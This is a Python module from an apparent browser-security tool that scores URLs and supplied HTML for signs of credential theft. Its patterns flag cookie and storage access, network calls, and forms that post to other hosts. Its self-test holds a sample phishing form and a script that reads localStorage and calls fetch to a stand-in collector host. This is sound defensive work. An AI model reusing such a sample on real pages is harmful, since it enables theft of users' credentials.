
"""
Browser Shield - Module 3
Information Stealer Risk Detection

Scope:
- Analyze a supplied URL.
- Optionally analyze supplied HTML/page text.
- Detect explainable credential-collection and data-access indicators.
- Does NOT execute scripts, visit URLs, inspect OS processes, or collect secrets.
"""

import re
from urllib.parse import urlsplit, unquote

from bs4 import BeautifulSoup


MODULE_NAME = "Information Stealer Risk Detection"

SUSPICIOUS_URL_TERMS = {
    "stealer": 15,
    "credential": 10,
    "harvest": 10,
    "password": 5,
    "token": 5,
    "exfil": 15,
}

SENSITIVE_JS_PATTERNS = {
    "document.cookie": r"\bdocument\s*\.\s*cookie\b",
    "localStorage access": r"\blocalStorage\b",
    "sessionStorage access": r"\bsessionStorage\b",
    "credential-related wording": r"\b(password|credential|auth[_-]?token)\b",
}

NETWORK_PATTERNS = {
    "Fetch API usage": r"\bfetch\s*\(",
    "XMLHttpRequest usage": r"\bXMLHttpRequest\b",
    "sendBeacon usage": r"\bnavigator\s*\.\s*sendBeacon\s*\(",
}

SUSPICIOUS_EXTENSIONS = (".exe", ".scr", ".msi", ".bat", ".cmd", ".ps1")


def _result(url, score=0, indicators=None, explanation=None,
            recommendations=None, invalid=False):
    """Return a consistent result structure for Browser Shield integration."""

    score = max(0, min(int(score), 100))
    indicators = indicators or []
    explanation = explanation or []

    if invalid:
        status = "Invalid Input"
        threat = "Unknown"
    elif score == 0:
        status = "No URL/Page Red Flags Found"
        threat = "No configured indicators detected"
    elif score < 30:
        status = "Needs Review"
        threat = "Potential information-stealer risk"
    elif score < 60:
        status = "Suspicious"
        threat = "Potential information-stealer risk"
    else:
        status = "High Risk"
        threat = "Multiple high-risk indicators"

    return {
        "module": MODULE_NAME,
        "threat": threat,
        "risk_score": score,
        "status": status,
        "indicators": indicators,
        "explanation": explanation,
        "recommendations": recommendations or [],
        "url": url,
    }


def _valid_http_url(raw_url):
    """Validate an absolute HTTP/HTTPS URL and return its parsed parts."""

    if not isinstance(raw_url, str) or not raw_url.strip():
        return None

    try:
        parts = urlsplit(raw_url.strip())

        if parts.scheme.lower() not in ("http", "https"):
            return None

        if not parts.hostname:
            return None

        # Accessing .port also validates malformed port values.
        _ = parts.port

        return parts

    except (ValueError, TypeError):
        return None


def _same_host_or_subdomain(candidate_host, page_host):
    """Allow same host and its subdomains; reject unrelated hosts."""

    candidate_host = (candidate_host or "").lower().rstrip(".")
    page_host = (page_host or "").lower().rstrip(".")

    if not candidate_host or not page_host:
        return False

    return (
        candidate_host == page_host
        or candidate_host.endswith("." + page_host)
    )


def analyze_stealer_risk(url, page_text=""):
    """
    Analyze a supplied URL and optional HTML/page-text sample.

    page_text should be supplied by a trusted local test or future browser
    integration. This function does not fetch or execute the page.
    """

    parts = _valid_http_url(url)

    if parts is None:
        return _result(
            url=url if isinstance(url, str) else "",
            invalid=True,
            explanation=["Input is not a valid absolute HTTP/HTTPS URL."],
            recommendations=[
                "Provide a complete URL such as https://example.com/"
            ],
        )

    score = 0
    indicators = []
    explanation = []
    recommendations = []
    host = parts.hostname.lower()
    decoded_url = unquote(url).lower()

    def add_indicator(label, points, detail):
        nonlocal score
        score += points
        indicators.append(label)
        explanation.append(f"{detail} (+{points})")

    # 1. URL-based indicators
    for term, points in SUSPICIOUS_URL_TERMS.items():
        if re.search(rf"(?<![a-z0-9]){re.escape(term)}(?![a-z0-9])",
                     decoded_url):
            add_indicator(
                f"URL contains '{term}'",
                points,
                f"URL contains the term '{term}'"
            )

    if parts.scheme.lower() == "http":
        add_indicator(
            "Unencrypted HTTP",
            5,
            "The URL uses HTTP instead of HTTPS"
        )

    if any(parts.path.lower().endswith(ext)
           for ext in SUSPICIOUS_EXTENSIONS):
        add_indicator(
            "Executable-looking URL path",
            10,
            "The URL path ends with a potentially executable file extension"
        )

    # 2. Optional supplied HTML/page-text analysis
    if isinstance(page_text, str) and page_text.strip():
        soup = BeautifulSoup(page_text, "html.parser")

        # Password fields: legitimate login forms can also contain these.
        password_fields = soup.select('input[type="password"]')
        if password_fields:
            add_indicator(
                "Password input field",
                10,
                "The supplied HTML contains a password input field"
            )

        # Inspect form destinations without submitting anything.
        external_forms = 0
        for form in soup.find_all("form"):
            action = (form.get("action") or "").strip()

            if not action:
                continue

            action_parts = urlsplit(action)

            if action_parts.scheme or action_parts.netloc:
                action_host = action_parts.hostname
                if action_host and not _same_host_or_subdomain(
                    action_host, host
                ):
                    external_forms += 1

        if external_forms:
            add_indicator(
                "Form submits to another host",
                20,
                "A form in the supplied HTML points to a different host"
            )

        # Inspect script text only. Never execute scripts.
        script_text = "\n".join(
            script.get_text(" ", strip=False)
            for script in soup.find_all("script")
        )
        combined_text = soup.get_text(" ", strip=True) + "\n" + script_text

        matched_sensitive = []
        for label, pattern in SENSITIVE_JS_PATTERNS.items():
            if re.search(pattern, combined_text, re.IGNORECASE):
                matched_sensitive.append(label)

        # Cap the contribution from storage/credential-related terms.
        sensitive_points = min(len(matched_sensitive) * 5, 15)
        if sensitive_points:
            score += sensitive_points
            indicators.extend(matched_sensitive)
            explanation.append(
                "Supplied page text contains credential/storage-related "
                f"indicators (+{sensitive_points})"
            )

        matched_network = []
        for label, pattern in NETWORK_PATTERNS.items():
            if re.search(pattern, combined_text, re.IGNORECASE):
                matched_network.append(label)

        network_points = min(len(matched_network) * 5, 10)
        if network_points:
            score += network_points
            indicators.extend(matched_network)
            explanation.append(
                f"Supplied page text contains network API indicators "
                f"(+{network_points})"
            )

        # Stronger combined signal: sensitive access + a network API.
        if matched_sensitive and matched_network:
            add_indicator(
                "Data-access and network indicators together",
                15,
                "Sensitive-data-related and network API indicators appear "
                "in the same supplied sample"
            )

    score = min(score, 100)

    if score >= 60:
        recommendations.extend([
            "Avoid entering passwords or sensitive information on this page.",
            "Verify the domain through an independent trusted source.",
            "Use a reputable security scanner to check the URL if needed.",
        ])
    elif score >= 30:
        recommendations.extend([
            "Review the domain and page behavior before entering credentials.",
            "Do not download unexpected files from this page.",
        ])
    elif score > 0:
        recommendations.append(
            "Review the detected indicators; they are not proof of malware."
        )
    else:
        recommendations.append(
            "No configured indicators were found; this does not guarantee safety."
        )

    if not page_text:
        explanation.append(
            "No page HTML/text was supplied; only URL-based checks were run."
        )

    return _result(
        url=url,
        score=score,
        indicators=indicators,
        explanation=explanation,
        recommendations=recommendations,
    )


# Compatibility alias, if another file uses this function name.
def detect_information_stealer_risk(url, page_text=""):
    return analyze_stealer_risk(url, page_text)


if __name__ == "__main__":
    test_url = "https://example.com/login"
    sample_html = """
    <html>
      <form action="https://collector.invalid/submit" method="post">
        <input type="password" name="password">
      </form>
      <script>
        const data = localStorage.getItem("session");
        fetch("https://collector.invalid/submit", {method: "POST"});
      </script>
    </html>
    """

    result = analyze_stealer_risk(test_url, sample_html)

    print("\n=== Browser Shield: Module 3 ===")
    for key, value in result.items():
        print(f"{key}: {value}")
